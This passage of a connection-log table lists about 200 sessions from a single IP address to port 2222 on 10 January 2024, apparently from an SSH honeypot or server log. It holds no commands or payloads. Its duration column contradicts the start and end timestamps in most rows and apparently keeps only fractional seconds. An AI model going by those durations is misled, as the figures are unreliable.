| `49682750d0cd` | `138.197.148.152` | `41690` | `2222` | `2024-01-10 02:02:37.967478` | `2024-01-10 02:06:10.251344` | `0.283866` |
| `5eb4ff27bb8e` | `138.197.148.152` | `42122` | `2222` | `2024-01-10 02:02:37.968266` | `2024-01-10 02:06:10.252052` | `0.283786` |
| `e11500ba873a` | `138.197.148.152` | `42370` | `2222` | `2024-01-10 02:02:37.969085` | `2024-01-10 02:06:10.237250` | `0.268165` |
| `f5114fd1000e` | `138.197.148.152` | `42848` | `2222` | `2024-01-10 02:02:37.969784` | `2024-01-10 02:06:10.250636` | `0.280852` |
| `387073e5d177` | `138.197.148.152` | `45984` | `2222` | `2024-01-10 02:02:37.970464` | `2024-01-10 02:06:10.249920` | `0.279456` |
| `faf9199cbefe` | `138.197.148.152` | `46590` | `2222` | `2024-01-10 02:02:37.971160` | `2024-01-10 02:06:10.275785` | `0.304625` |
| `e41a6fa46f7f` | `138.197.148.152` | `51036` | `2222` | `2024-01-10 02:02:37.972115` | `2024-01-10 02:03:09.865864` | `0.893749` |
| `13bcf77ed612` | `138.197.148.152` | `51522` | `2222` | `2024-01-10 02:02:37.972911` | `2024-01-10 02:03:09.866467` | `0.893556` |
| `1e693cdf846d` | `138.197.148.152` | `57652` | `2222` | `2024-01-10 02:02:37.973598` | `2024-01-10 02:03:09.867754` | `0.894156` |
| `93cbdd8c5f04` | `138.197.148.152` | `58216` | `2222` | `2024-01-10 02:02:37.974269` | `2024-01-10 02:03:09.868553` | `0.894284` |
| `769dca850b54` | `138.197.148.152` | `58306` | `2222` | `2024-01-10 02:02:37.974951` | `2024-01-10 02:03:09.860765` | `0.885814` |
| `4567bb058050` | `138.197.148.152` | `58910` | `2222` | `2024-01-10 02:02:37.975642` | `2024-01-10 02:06:10.252782` | `0.27714` |
| `a2e7f9cec93e` | `138.197.148.152` | `33846` | `2222` | `2024-01-10 02:02:37.976479` | `2024-01-10 02:03:09.894084` | `0.917605` |
| `20fde149fba4` | `138.197.148.152` | `34278` | `2222` | `2024-01-10 02:02:37.977191` | `2024-01-10 02:03:09.863552` | `0.886361` |
| `4c0042c9a916` | `138.197.148.152` | `38910` | `2222` | `2024-01-10 02:02:37.978529` | `2024-01-10 02:03:09.869401` | `0.890872` |
| `fb3f984f63a7` | `138.197.148.152` | `39162` | `2222` | `2024-01-10 02:02:37.979199` | `2024-01-10 02:03:09.867083` | `0.887884` |
| `0937726357a5` | `138.197.148.152` | `45478` | `2222` | `2024-01-10 02:02:37.979858` | `2024-01-10 02:03:09.865039` | `0.885181` |
| `948c15dd3ee5` | `138.197.148.152` | `45880` | `2222` | `2024-01-10 02:02:37.980575` | `2024-01-10 02:03:09.911035` | `0.93046` |
| `e1fa2fd60759` | `138.197.148.152` | `46188` | `2222` | `2024-01-10 02:02:37.981238` | `2024-01-10 02:03:09.862941` | `0.881703` |
| `e8138faea0a6` | `138.197.148.152` | `46576` | `2222` | `2024-01-10 02:02:37.982016` | `2024-01-10 02:06:10.253397` | `0.271381` |
| `805663706156` | `138.197.148.152` | `49840` | `2222` | `2024-01-10 02:02:37.982677` | `2024-01-10 02:06:10.253995` | `0.271318` |
| `6ccf615b37a3` | `138.197.148.152` | `50296` | `2222` | `2024-01-10 02:03:08.016717` | `2024-01-10 02:03:09.861447` | `0.84473` |
| `3ec32fb98836` | `138.197.148.152` | `54682` | `2222` | `2024-01-10 02:03:08.017424` | `2024-01-10 02:06:10.254629` | `0.237205` |
| `aa6b208aabf2` | `138.197.148.152` | `55448` | `2222` | `2024-01-10 02:03:08.018105` | `2024-01-10 02:06:10.255246` | `0.237141` |
| `2e074e6e7025` | `138.197.148.152` | `33116` | `2222` | `2024-01-10 02:03:08.018781` | `2024-01-10 02:06:10.255916` | `0.237135` |
| `63f5f2e59bed` | `138.197.148.152` | `33818` | `2222` | `2024-01-10 02:03:08.019446` | `2024-01-10 02:06:10.256574` | `0.237128` |
| `f7524f5ae174` | `138.197.148.152` | `33850` | `2222` | `2024-01-10 02:03:08.020100` | `2024-01-10 02:06:10.257179` | `0.237079` |
| `92123421d8fc` | `138.197.148.152` | `34560` | `2222` | `2024-01-10 02:03:08.021163` | `2024-01-10 02:06:10.257811` | `0.236648` |
| `16320d9b1f8d` | `138.197.148.152` | `37472` | `2222` | `2024-01-10 02:03:08.022211` | `2024-01-10 02:06:10.258412` | `0.236201` |
| `475b81cdb976` | `138.197.148.152` | `38230` | `2222` | `2024-01-10 02:03:08.022879` | `2024-01-10 02:06:10.259007` | `0.236128` |
| `5c65c10868e3` | `138.197.148.152` | `42460` | `2222` | `2024-01-10 02:03:08.024918` | `2024-01-10 02:06:10.260240` | `0.235322` |
| `f4a30a541828` | `138.197.148.152` | `43258` | `2222` | `2024-01-10 02:03:08.025574` | `2024-01-10 02:06:10.261213` | `0.235639` |
| `52fc084bdf7c` | `138.197.148.152` | `49084` | `2222` | `2024-01-10 02:03:08.026242` | `2024-01-10 02:06:10.261810` | `0.235568` |
| `9a851adbc1c1` | `138.197.148.152` | `49760` | `2222` | `2024-01-10 02:03:08.026893` | `2024-01-10 02:06:10.262404` | `0.235511` |
| `2458bf1d2c2a` | `138.197.148.152` | `49910` | `2222` | `2024-01-10 02:03:08.027561` | `2024-01-10 02:06:10.263016` | `0.235455` |
| `88a0afa56ac2` | `138.197.148.152` | `50598` | `2222` | `2024-01-10 02:03:08.028224` | `2024-01-10 02:06:10.263624` | `0.2354` |
| `5cc4ca7cf0f0` | `138.197.148.152` | `53388` | `2222` | `2024-01-10 02:03:08.028947` | `2024-01-10 02:06:10.264216` | `0.235269` |
| `f96ecbc387a7` | `138.197.148.152` | `54328` | `2222` | `2024-01-10 02:03:08.029605` | `2024-01-10 02:06:10.265004` | `0.235399` |
| `ebe092ece681` | `138.197.148.152` | `58422` | `2222` | `2024-01-10 02:03:39.986377` | `2024-01-10 02:06:10.265581` | `0.279204` |
| `44a82d002c56` | `138.197.148.152` | `59236` | `2222` | `2024-01-10 02:03:39.987151` | `2024-01-10 02:06:10.266173` | `0.279022` |
| `ca3ff1ee5316` | `138.197.148.152` | `36804` | `2222` | `2024-01-10 02:03:39.987832` | `2024-01-10 02:06:10.266759` | `0.278927` |
| `711f2161605a` | `138.197.148.152` | `37516` | `2222` | `2024-01-10 02:03:39.988641` | `2024-01-10 02:06:10.267336` | `0.278695` |
| `eb8da0eb16f8` | `138.197.148.152` | `37644` | `2222` | `2024-01-10 02:03:39.989352` | `2024-01-10 02:06:10.267919` | `0.278567` |
| `ecfede8d1020` | `138.197.148.152` | `38336` | `2222` | `2024-01-10 02:03:39.989984` | `2024-01-10 02:06:10.268605` | `0.278621` |
| `b903fd28e72e` | `138.197.148.152` | `41202` | `2222` | `2024-01-10 02:03:39.991169` | `2024-01-10 02:06:10.269195` | `0.278026` |
| `c136af827e6c` | `138.197.148.152` | `42002` | `2222` | `2024-01-10 02:03:39.991853` | `2024-01-10 02:06:10.269763` | `0.27791` |
| `ebcb58e762f6` | `138.197.148.152` | `46102` | `2222` | `2024-01-10 02:03:39.993257` | `2024-01-10 02:06:10.270953` | `0.277696` |
| `4160e9e75478` | `138.197.148.152` | `47060` | `2222` | `2024-01-10 02:03:39.993950` | `2024-01-10 02:06:10.271545` | `0.277595` |
| `6ca3f7fc74e7` | `138.197.148.152` | `52692` | `2222` | `2024-01-10 02:03:39.994637` | `2024-01-10 02:06:10.272134` | `0.277497` |
| `1032c1890ac3` | `138.197.148.152` | `53370` | `2222` | `2024-01-10 02:03:39.995318` | `2024-01-10 02:06:10.272772` | `0.277454` |
| `558e6c76be7a` | `138.197.148.152` | `53758` | `2222` | `2024-01-10 02:03:39.995980` | `2024-01-10 02:06:10.273359` | `0.277379` |
| `ea23ee2e4c15` | `138.197.148.152` | `54430` | `2222` | `2024-01-10 02:03:39.996727` | `2024-01-10 02:06:10.273937` | `0.27721` |
| `a1d15face405` | `138.197.148.152` | `57066` | `2222` | `2024-01-10 02:03:39.997389` | `2024-01-10 02:06:10.274517` | `0.277128` |
| `e8a2afd524f6` | `138.197.148.152` | `58032` | `2222` | `2024-01-10 02:03:39.998073` | `2024-01-10 02:06:10.275087` | `0.277014` |
| `174c54c0e216` | `138.197.148.152` | `33740` | `2222` | `2024-01-10 02:06:10.237907` | `2024-01-10 02:06:11.992747` | `0.75484` |
| `5cb356b4a2b9` | `138.197.148.152` | `34854` | `2222` | `2024-01-10 02:06:10.238624` | `2024-01-10 02:06:12.080518` | `0.841894` |
| `a7e037ad9da2` | `138.197.148.152` | `40406` | `2222` | `2024-01-10 02:06:10.239293` | `2024-01-10 02:06:12.106731` | `0.867438` |
| `3d3e2234d837` | `138.197.148.152` | `41102` | `2222` | `2024-01-10 02:06:10.239961` | `2024-01-10 02:06:12.043679` | `0.803718` |
| `da9b8bc4d68b` | `138.197.148.152` | `41476` | `2222` | `2024-01-10 02:06:10.240713` | `2024-01-10 02:06:12.029741` | `0.789028` |
| `75c9bfc017a6` | `138.197.148.152` | `42176` | `2222` | `2024-01-10 02:06:10.241396` | `2024-01-10 02:06:12.120753` | `0.879357` |
| `03410ff5afa5` | `138.197.148.152` | `44760` | `2222` | `2024-01-10 02:06:10.242730` | `2024-01-10 02:06:12.523381` | `0.280651` |
| `74375ea59af0` | `138.197.148.152` | `45858` | `2222` | `2024-01-10 02:06:10.243406` | `2024-01-10 02:06:11.978434` | `0.735028` |
| `778d6276af77` | `138.197.148.152` | `49686` | `2222` | `2024-01-10 02:06:10.244073` | `2024-01-10 02:06:12.018152` | `0.774079` |
| `d631a874da1b` | `138.197.148.152` | `50884` | `2222` | `2024-01-10 02:06:10.244836` | `2024-01-10 02:06:12.067936` | `0.8231` |
| `9f041427ca08` | `138.197.148.152` | `56206` | `2222` | `2024-01-10 02:06:10.245518` | `2024-01-10 02:06:12.005263` | `0.759745` |
| `acf9249d1d62` | `138.197.148.152` | `56902` | `2222` | `2024-01-10 02:06:10.246174` | `2024-01-10 02:06:12.094105` | `0.847931` |
| `24bf92acd72c` | `138.197.148.152` | `57594` | `2222` | `2024-01-10 02:06:10.246845` | `2024-01-10 02:06:12.132894` | `0.886049` |
| `fbabe5865488` | `138.197.148.152` | `58294` | `2222` | `2024-01-10 02:06:10.247664` | `2024-01-10 02:06:12.644155` | `0.396491` |
| `4b0eaa3d8519` | `138.197.148.152` | `60596` | `2222` | `2024-01-10 02:06:10.248339` | `2024-01-10 02:06:12.055376` | `0.807037` |
| `ac43a3ce172c` | `138.197.148.152` | `33744` | `2222` | `2024-01-10 02:06:10.249045` | `2024-01-10 02:06:12.496456` | `0.247411` |
| `f5d345fe39a6` | `138.197.148.152` | `37164` | `2222` | `2024-01-10 02:06:10.277282` | `2024-01-10 02:06:12.470253` | `0.192971` |
| `b74222742eb0` | `138.197.148.152` | `38838` | `2222` | `2024-01-10 02:06:10.277954` | `2024-01-10 02:06:12.395229` | `0.117275` |
| `4ae782f816f8` | `138.197.148.152` | `43732` | `2222` | `2024-01-10 02:06:10.278627` | `2024-01-10 02:06:12.430606` | `0.151979` |
| `c1580553b154` | `138.197.148.152` | `44398` | `2222` | `2024-01-10 02:06:10.279287` | `2024-01-10 02:06:12.456310` | `0.177023` |
| `c09513b51668` | `138.197.148.152` | `45562` | `2222` | `2024-01-10 02:06:10.279976` | `2024-01-10 02:06:12.533651` | `0.253675` |
| `c5a77965b290` | `138.197.148.152` | `46236` | `2222` | `2024-01-10 02:06:10.280676` | `2024-01-10 02:06:12.366897` | `0.086221` |
| `b65ff1a33acb` | `138.197.148.152` | `48086` | `2222` | `2024-01-10 02:06:10.281337` | `2024-01-10 02:06:12.252187` | `0.97085` |
| `2f90ce2200bd` | `138.197.148.152` | `49942` | `2222` | `2024-01-10 02:06:10.282148` | `2024-01-10 02:06:12.419088` | `0.13694` |
| `7e5fe686884d` | `138.197.148.152` | `52892` | `2222` | `2024-01-10 02:06:10.282835` | `2024-01-10 02:06:12.545926` | `0.263091` |
| `8b9681018165` | `138.197.148.152` | `55018` | `2222` | `2024-01-10 02:06:10.284167` | `2024-01-10 02:06:12.320132` | `0.035965` |
| `5a4431510a92` | `138.197.148.152` | `59552` | `2222` | `2024-01-10 02:06:10.284866` | `2024-01-10 02:06:12.594337` | `0.309471` |
| `4aa6aa8375e1` | `138.197.148.152` | `60240` | `2222` | `2024-01-10 02:06:10.285537` | `2024-01-10 02:06:12.507643` | `0.222106` |
| `95b6559ec706` | `138.197.148.152` | `33480` | `2222` | `2024-01-10 02:06:10.286195` | `2024-01-10 02:06:12.354593` | `0.068398` |
| `f6bb9c141849` | `138.197.148.152` | `34184` | `2222` | `2024-01-10 02:06:10.286981` | `2024-01-10 02:06:12.229960` | `0.942979` |
| `3921b357a172` | `138.197.148.152` | `35600` | `2222` | `2024-01-10 02:06:10.287646` | `2024-01-10 02:06:12.408894` | `0.121248` |
| `0bfbdac8c97e` | `138.197.148.152` | `37898` | `2222` | `2024-01-10 02:06:10.288304` | `2024-01-10 02:06:12.483713` | `0.195409` |
| `322a1f6e75af` | `138.197.148.152` | `41642` | `2222` | `2024-01-10 02:06:10.289636` | `2024-01-10 02:06:12.380715` | `0.091079` |
| `386dde2e0f3b` | `138.197.148.152` | `41766` | `2222` | `2024-01-10 02:06:10.290441` | `2024-01-10 02:06:12.345158` | `0.054717` |
| `d78b897d2a43` | `138.197.148.152` | `47932` | `2222` | `2024-01-10 02:06:10.291370` | `2024-01-10 02:06:12.329676` | `0.038306` |
| `6159a3af0eb0` | `138.197.148.152` | `48638` | `2222` | `2024-01-10 02:06:10.292141` | `2024-01-10 02:06:12.277047` | `0.984906` |
| `45f3d290d266` | `138.197.148.152` | `48806` | `2222` | `2024-01-10 02:06:10.294252` | `2024-01-10 02:06:12.618485` | `0.324233` |
| `f2fbd3a8e6ea` | `138.197.148.152` | `49622` | `2222` | `2024-01-10 02:06:10.295010` | `2024-01-10 02:06:12.299028` | `0.004018` |
| `3ed4606cd846` | `138.197.148.152` | `52188` | `2222` | `2024-01-10 02:06:10.295858` | `2024-01-10 02:06:12.446274` | `0.150416` |
| `898bcb15b6df` | `138.197.148.152` | `53330` | `2222` | `2024-01-10 02:06:10.296592` | `2024-01-10 02:06:12.567254` | `0.270662` |
| `d1eb12410ae8` | `138.197.148.152` | `56400` | `2222` | `2024-01-10 02:13:28.412805` | `2024-01-10 02:13:29.933316` | `0.520511` |
| `485399fd939f` | `138.197.148.152` | `58884` | `2222` | `2024-01-10 02:14:17.425025` | `2024-01-10 02:14:18.943971` | `0.518946` |
| `93ed8073a72d` | `138.197.148.152` | `34988` | `2222` | `2024-01-10 02:17:26.064936` | `2024-01-10 02:17:27.568065` | `0.503129` |
| `ce7a02cbbcc5` | `138.197.148.152` | `35674` | `2222` | `2024-01-10 02:17:29.099296` | `2024-01-10 02:17:30.613281` | `0.513985` |
| `cfbe8074289f` | `138.197.148.152` | `37092` | `2222` | `2024-01-10 02:17:34.592160` | `2024-01-10 02:17:36.114034` | `0.521874` |
| `02b8204399fa` | `138.197.148.152` | `37836` | `2222` | `2024-01-10 02:17:37.110627` | `2024-01-10 02:17:38.625621` | `0.514994` |
| `e4c0a8a39a3c` | `138.197.148.152` | `39376` | `2222` | `2024-01-10 02:17:42.084949` | `2024-01-10 02:17:43.603088` | `0.518139` |
| `71665e509996` | `138.197.148.152` | `41586` | `2222` | `2024-01-10 02:17:48.455063` | `2024-01-10 02:17:49.971582` | `0.516519` |
| `0e6de763477d` | `138.197.148.152` | `45018` | `2222` | `2024-01-10 02:18:46.082478` | `2024-01-10 02:18:47.604682` | `0.522204` |
| `be168d7d8cd6` | `138.197.148.152` | `45794` | `2222` | `2024-01-10 02:18:46.746015` | `2024-01-10 02:18:48.266312` | `0.520297` |
| `57358a7a8ae3` | `138.197.148.152` | `51674` | `2222` | `2024-01-10 02:18:50.200154` | `2024-01-10 02:18:51.724118` | `0.523964` |
| `c1aec69e658f` | `138.197.148.152` | `52354` | `2222` | `2024-01-10 02:18:50.687129` | `2024-01-10 02:18:52.202012` | `0.514883` |
| `7338708f32cb` | `138.197.148.152` | `52434` | `2222` | `2024-01-10 02:18:50.745330` | `2024-01-10 02:18:52.248343` | `0.503013` |
| `430e9fd789ab` | `138.197.148.152` | `53176` | `2222` | `2024-01-10 02:18:51.020742` | `2024-01-10 02:18:52.530198` | `0.509456` |
| `166d2d774e6d` | `138.197.148.152` | `56024` | `2222` | `2024-01-10 02:18:52.685544` | `2024-01-10 02:18:54.220474` | `0.53493` |
| `57afd29a30f2` | `138.197.148.152` | `56772` | `2222` | `2024-01-10 02:18:53.064213` | `2024-01-10 02:18:54.570524` | `0.506311` |
| `1e12f5abe13b` | `138.197.148.152` | `32964` | `2222` | `2024-01-10 02:19:10.817124` | `2024-01-10 02:19:12.347348` | `0.530224` |
| `b79d72c14c3b` | `138.197.148.152` | `33288` | `2222` | `2024-01-10 02:19:11.015962` | `2024-01-10 02:19:12.547232` | `0.53127` |
| `8b8a0c2a66d8` | `138.197.148.152` | `39662` | `2222` | `2024-01-10 02:19:14.128104` | `2024-01-10 02:19:15.649580` | `0.521476` |
| `0f6b9c2ad8f3` | `138.197.148.152` | `39860` | `2222` | `2024-01-10 02:19:14.245615` | `2024-01-10 02:19:15.789490` | `0.543875` |
| `6b760cfdf98d` | `138.197.148.152` | `40346` | `2222` | `2024-01-10 02:19:14.513558` | `2024-01-10 02:19:16.037197` | `0.523639` |
| `123a56c52fba` | `138.197.148.152` | `40556` | `2222` | `2024-01-10 02:19:14.622869` | `2024-01-10 02:19:16.138339` | `0.51547` |
| `ba694b09d89f` | `138.197.148.152` | `44124` | `2222` | `2024-01-10 02:19:16.302746` | `2024-01-10 02:19:17.820661` | `0.517915` |
| `987997b74bd2` | `138.197.148.152` | `44136` | `2222` | `2024-01-10 02:19:16.311342` | `2024-01-10 02:19:17.831649` | `0.520307` |
| `3a9f2de4c542` | `138.197.148.152` | `48832` | `2222` | `2024-01-10 02:19:32.511161` | `2024-01-10 02:19:34.027298` | `0.516137` |
| `1f3c11c7497e` | `138.197.148.152` | `49358` | `2222` | `2024-01-10 02:19:32.779560` | `2024-01-10 02:19:34.287672` | `0.508112` |
| `6666fbd9384d` | `138.197.148.152` | `55400` | `2222` | `2024-01-10 02:19:35.700996` | `2024-01-10 02:19:37.219820` | `0.518824` |
| `451aea8c171a` | `138.197.148.152` | `56060` | `2222` | `2024-01-10 02:19:36.045490` | `2024-01-10 02:19:37.564315` | `0.518825` |
| `6939fc9e6549` | `138.197.148.152` | `56142` | `2222` | `2024-01-10 02:19:36.064286` | `2024-01-10 02:19:37.572826` | `0.50854` |
| `b0678dc4f511` | `138.197.148.152` | `56770` | `2222` | `2024-01-10 02:19:36.223666` | `2024-01-10 02:19:37.727146` | `0.50348` |
| `c1c5401a7b93` | `138.197.148.152` | `59734` | `2222` | `2024-01-10 02:19:37.728143` | `2024-01-10 02:19:39.248546` | `0.520403` |
| `82dd659e84da` | `138.197.148.152` | `60458` | `2222` | `2024-01-10 02:19:38.091861` | `2024-01-10 02:19:39.597208` | `0.505347` |
| `6b412feec693` | `138.197.148.152` | `36278` | `2222` | `2024-01-10 02:19:53.419706` | `2024-01-10 02:19:54.946382` | `0.526676` |
| `255c663bff42` | `138.197.148.152` | `37326` | `2222` | `2024-01-10 02:19:53.937457` | `2024-01-10 02:19:55.457177` | `0.51972` |
| `2934d1fb7eae` | `138.197.148.152` | `42976` | `2222` | `2024-01-10 02:19:56.557802` | `2024-01-10 02:19:58.099441` | `0.541639` |
| `10558734470e` | `138.197.148.152` | `43686` | `2222` | `2024-01-10 02:19:56.906254` | `2024-01-10 02:19:58.437437` | `0.531183` |
| `c8ae107475d3` | `138.197.148.152` | `43922` | `2222` | `2024-01-10 02:19:57.028644` | `2024-01-10 02:19:58.547020` | `0.518376` |
| `ce154f52e7c6` | `138.197.148.152` | `44616` | `2222` | `2024-01-10 02:19:57.372952` | `2024-01-10 02:19:58.897391` | `0.524439` |
| `1e908723c9dc` | `138.197.148.152` | `47352` | `2222` | `2024-01-10 02:19:58.636721` | `2024-01-10 02:20:00.168240` | `0.531519` |
| `131da2836375` | `138.197.148.152` | `48318` | `2222` | `2024-01-10 02:19:59.106631` | `2024-01-10 02:20:00.638817` | `0.532186` |
| `7657c0c3e4fb` | `138.197.148.152` | `52316` | `2222` | `2024-01-10 02:20:14.366097` | `2024-01-10 02:20:15.884722` | `0.518625` |
| `69834f41227d` | `138.197.148.152` | `53266` | `2222` | `2024-01-10 02:20:14.848869` | `2024-01-10 02:20:16.376483` | `0.527614` |
| `f21a94d010cb` | `138.197.148.152` | `58888` | `2222` | `2024-01-10 02:20:17.541734` | `2024-01-10 02:20:19.059757` | `0.518023` |
| `4dc271a092a4` | `138.197.148.152` | `59568` | `2222` | `2024-01-10 02:20:17.891148` | `2024-01-10 02:20:19.406356` | `0.515208` |
| `5af56847bb32` | `138.197.148.152` | `59966` | `2222` | `2024-01-10 02:20:18.083759` | `2024-01-10 02:20:19.598086` | `0.514327` |
| `f31825389c4d` | `138.197.148.152` | `60642` | `2222` | `2024-01-10 02:20:18.430944` | `2024-01-10 02:20:19.963620` | `0.532676` |
| `460468f81414` | `138.197.148.152` | `35016` | `2222` | `2024-01-10 02:20:19.599814` | `2024-01-10 02:20:21.118547` | `0.518733` |
| `60c186d8d2c5` | `138.197.148.152` | `36094` | `2222` | `2024-01-10 02:20:20.119535` | `2024-01-10 02:20:21.649212` | `0.529677` |
| `b206243406cc` | `138.197.148.152` | `39624` | `2222` | `2024-01-10 02:20:34.912790` | `2024-01-10 02:20:36.416706` | `0.503916` |
| `dd55cc1faf6d` | `138.197.148.152` | `41502` | `2222` | `2024-01-10 02:20:35.731200` | `2024-01-10 02:20:37.239990` | `0.50879` |
| `4178caf39603` | `138.197.148.152` | `46258` | `2222` | `2024-01-10 02:20:38.052709` | `2024-01-10 02:20:39.572215` | `0.519506` |
| `409ae4a4d45c` | `138.197.148.152` | `46920` | `2222` | `2024-01-10 02:20:38.381686` | `2024-01-10 02:20:39.884251` | `0.502565` |
| `7ed47e18b8f4` | `138.197.148.152` | `48148` | `2222` | `2024-01-10 02:20:38.997383` | `2024-01-10 02:20:40.504979` | `0.507596` |
| `08f3e47cb6e3` | `138.197.148.152` | `48838` | `2222` | `2024-01-10 02:20:39.345302` | `2024-01-10 02:20:40.864990` | `0.519688` |
| `96b8d25e10da` | `138.197.148.152` | `50598` | `2222` | `2024-01-10 02:20:40.115033` | `2024-01-10 02:20:41.631270` | `0.516237` |
| `91be926f0f10` | `138.197.148.152` | `52468` | `2222` | `2024-01-10 02:20:41.016970` | `2024-01-10 02:20:42.522292` | `0.505322` |
| `a227d58f2490` | `138.197.148.152` | `55522` | `2222` | `2024-01-10 02:20:55.796938` | `2024-01-10 02:20:57.329250` | `0.532312` |
| `0aa74c392fc9` | `138.197.148.152` | `57538` | `2222` | `2024-01-10 02:20:56.676958` | `2024-01-10 02:20:58.207270` | `0.530312` |
| `8c5c18abe26e` | `138.197.148.152` | `33888` | `2222` | `2024-01-10 02:20:58.810521` | `2024-01-10 02:21:00.318240` | `0.507719` |
| `6591472401e8` | `138.197.148.152` | `34552` | `2222` | `2024-01-10 02:20:59.133844` | `2024-01-10 02:21:00.651003` | `0.517159` |
| `934b9a66bb0c` | `138.197.148.152` | `35952` | `2222` | `2024-01-10 02:20:59.808930` | `2024-01-10 02:21:01.315588` | `0.506658` |
| `f809702baada` | `138.197.148.152` | `36652` | `2222` | `2024-01-10 02:21:00.058983` | `2024-01-10 02:21:01.551371` | `0.492388` |
| `238112203710` | `138.197.148.152` | `38262` | `2222` | `2024-01-10 02:21:00.873590` | `2024-01-10 02:21:02.382268` | `0.508678` |
| `8333c0fe966d` | `138.197.148.152` | `40330` | `2222` | `2024-01-10 02:21:01.910341` | `2024-01-10 02:21:03.430465` | `0.520124` |
| `c23134fc6fad` | `138.197.148.152` | `43026` | `2222` | `2024-01-10 02:21:16.726101` | `2024-01-10 02:21:18.243968` | `0.517867` |
| `52c77d64eebd` | `138.197.148.152` | `45510` | `2222` | `2024-01-10 02:21:17.944339` | `2024-01-10 02:21:19.464335` | `0.519996` |
| `69b4f39a9517` | `138.197.148.152` | `49684` | `2222` | `2024-01-10 02:21:19.940830` | `2024-01-10 02:21:21.458702` | `0.517872` |
| `9e1d9ed7948f` | `138.197.148.152` | `50372` | `2222` | `2024-01-10 02:21:20.283237` | `2024-01-10 02:21:21.788125` | `0.504888` |
| `308cefc95507` | `138.197.148.152` | `52140` | `2222` | `2024-01-10 02:21:21.091142` | `2024-01-10 02:21:22.606036` | `0.514894` |
| `0b3bfd3b2d4e` | `138.197.148.152` | `52828` | `2222` | `2024-01-10 02:21:21.434326` | `2024-01-10 02:21:22.951231` | `0.516905` |
| `b00e21197a0f` | `138.197.148.152` | `53982` | `2222` | `2024-01-10 02:21:21.998204` | `2024-01-10 02:21:23.514636` | `0.516432` |
| `5e47567b4e6f` | `138.197.148.152` | `56578` | `2222` | `2024-01-10 02:21:23.220156` | `2024-01-10 02:21:24.739760` | `0.519604` |
| `8b39874657c6` | `138.197.148.152` | `59066` | `2222` | `2024-01-10 02:21:38.025789` | `2024-01-10 02:21:39.544360` | `0.518571` |
| `a8a42931696a` | `138.197.148.152` | `33204` | `2222` | `2024-01-10 02:21:39.153889` | `2024-01-10 02:21:40.672997` | `0.519108` |
| `18dc759e85fc` | `138.197.148.152` | `37476` | `2222` | `2024-01-10 02:21:41.318301` | `2024-01-10 02:21:42.835611` | `0.51731` |
| `c7695b0b350f` | `138.197.148.152` | `38162` | `2222` | `2024-01-10 02:21:41.685318` | `2024-01-10 02:21:43.202421` | `0.517103` |
| `7d041fc13042` | `138.197.148.152` | `39846` | `2222` | `2024-01-10 02:21:42.542858` | `2024-01-10 02:21:44.050794` | `0.507936` |
| `11bd3e7e7cd0` | `138.197.148.152` | `40550` | `2222` | `2024-01-10 02:21:42.937244` | `2024-01-10 02:21:44.454824` | `0.51758` |
| `c772c4da67f5` | `138.197.148.152` | `41782` | `2222` | `2024-01-10 02:21:43.505725` | `2024-01-10 02:21:45.025006` | `0.519281` |
| `65561f34ab58` | `138.197.148.152` | `44258` | `2222` | `2024-01-10 02:21:44.788036` | `2024-01-10 02:21:46.311288` | `0.523252` |
| `4923a4dae9f1` | `138.197.148.152` | `46724` | `2222` | `2024-01-10 02:22:00.224186` | `2024-01-10 02:22:01.728718` | `0.504532` |
| `938fb4c80fc6` | `138.197.148.152` | `49300` | `2222` | `2024-01-10 02:22:01.489296` | `2024-01-10 02:22:03.007914` | `0.518618` |
| `33a561e70191` | `138.197.148.152` | `53266` | `2222` | `2024-01-10 02:22:03.529767` | `2024-01-10 02:22:05.056261` | `0.526494` |
| `53ee38fb26f3` | `138.197.148.152` | `53940` | `2222` | `2024-01-10 02:22:03.857922` | `2024-01-10 02:22:05.377593` | `0.519671` |
| `97bf6564c2e8` | `138.197.148.152` | `56002` | `2222` | `2024-01-10 02:22:04.921201` | `2024-01-10 02:22:06.441437` | `0.520236` |
| `ee1b19b28b9a` | `138.197.148.152` | `56694` | `2222` | `2024-01-10 02:22:05.264688` | `2024-01-10 02:22:06.785814` | `0.521126` |
| `cdb14dd38319` | `138.197.148.152` | `57548` | `2222` | `2024-01-10 02:22:05.618766` | `2024-01-10 02:22:07.124526` | `0.50576` |
| `cf75f6a4a3f9` | `138.197.148.152` | `60346` | `2222` | `2024-01-10 02:22:07.075691` | `2024-01-10 02:22:08.598630` | `0.522939` |
| `7ea277bfc997` | `138.197.148.152` | `34130` | `2222` | `2024-01-10 02:22:22.320901` | `2024-01-10 02:22:23.839992` | `0.519091` |
| `96ec24b034b0` | `138.197.148.152` | `37310` | `2222` | `2024-01-10 02:22:23.991274` | `2024-01-10 02:22:25.507502` | `0.516228` |
| `1a8fedca24ca` | `138.197.148.152` | `40718` | `2222` | `2024-01-10 02:22:25.687527` | `2024-01-10 02:22:27.215233` | `0.527706` |
| `3ffe3d0f58bd` | `138.197.148.152` | `41396` | `2222` | `2024-01-10 02:22:26.041428` | `2024-01-10 02:22:27.544657` | `0.503229` |
| `60c5d1909312` | `138.197.148.152` | `44134` | `2222` | `2024-01-10 02:22:27.423913` | `2024-01-10 02:22:28.955351` | `0.531438` |
| `4d5b6a561f71` | `138.197.148.152` | `44854` | `2222` | `2024-01-10 02:22:27.804694` | `2024-01-10 02:22:29.310277` | `0.505583` |
| `12f105e666c1` | `138.197.148.152` | `44936` | `2222` | `2024-01-10 02:22:27.846997` | `2024-01-10 02:22:29.361907` | `0.51491` |
| `eaa5bf12cae7` | `138.197.148.152` | `48558` | `2222` | `2024-01-10 02:22:29.686495` | `2024-01-10 02:22:31.219035` | `0.53254` |
| `67e13c16c1e5` | `138.197.148.152` | `49674` | `2222` | `2024-01-10 02:22:45.180604` | `2024-01-10 02:22:46.700567` | `0.519963` |
| `9b52b1030a80` | `138.197.148.152` | `53722` | `2222` | `2024-01-10 02:22:47.353257` | `2024-01-10 02:22:48.876606` | `0.523349` |
| `3a539487680f` | `138.197.148.152` | `56290` | `2222` | `2024-01-10 02:22:48.715209` | `2024-01-10 02:22:50.240205` | `0.524996` |
| `b1a345ee2894` | `138.197.148.152` | `56980` | `2222` | `2024-01-10 02:22:49.090705` | `2024-01-10 02:22:50.622864` | `0.532159` |
| `81f089b1c708` | `138.197.148.152` | `60424` | `2222` | `2024-01-10 02:22:50.898081` | `2024-01-10 02:22:52.417655` | `0.519574` |
| `428fa04f2ceb` | `138.197.148.152` | `60628` | `2222` | `2024-01-10 02:22:51.012128` | `2024-01-10 02:22:52.542894` | `0.530766` |
| `509054cc0bac` | `138.197.148.152` | `32872` | `2222` | `2024-01-10 02:22:51.283923` | `2024-01-10 02:22:52.826927` | `0.543004` |
